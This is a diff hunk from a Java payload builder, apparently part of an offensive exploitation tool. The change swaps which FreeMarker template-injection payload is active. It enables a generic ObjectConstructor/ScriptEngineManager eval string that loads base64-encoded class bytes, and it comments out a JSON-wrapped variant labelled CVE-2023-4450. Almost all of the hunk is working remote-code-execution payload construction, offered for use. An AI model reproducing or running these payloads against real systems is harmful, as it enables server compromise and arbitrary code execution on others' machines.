@@ -79,11 +79,12 @@ public class JavaClassBuilder {
                     codeClassName = javaClassHelper.getCLASSNAME();
                 }
 
-//                String freeMakerPayload = String.format("{\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval('%s')}", PayloadUtils.loadByScriptEngine(CryptoUtils.base64encoder(bytes), codeClassName));
+                // todo
+                String freeMakerPayload = String.format("{\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval('%s')}", PayloadUtils.loadByScriptEngine(CryptoUtils.base64encoder(bytes), codeClassName));
 
                 // CVE-2023-4450
-                String codec = PayloadUtils.loadByScriptEngine(CryptoUtils.base64encoder(bytes), codeClassName).replaceAll("\"", "\\\\\"");
-                String freeMakerPayload = String.format("{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval('%s#{1};')}\",\"dbSource\":\"\",\"type\":\"0\"}", codec);
+//                String codec = PayloadUtils.loadByScriptEngine(CryptoUtils.base64encoder(bytes), codeClassName).replaceAll("\"", "\\\\\"");
+//                String freeMakerPayload = String.format("{\"sql\":\"call${\\\"freemarker.template.utility.ObjectConstructor\\\"?new()(\\\"javax.script.ScriptEngineManager\\\").getEngineByName(\\\"js\\\").eval('%s#{1};')}\",\"dbSource\":\"\",\"type\":\"0\"}", codec);
 
                 Printer.print(freeMakerPayload);
         }
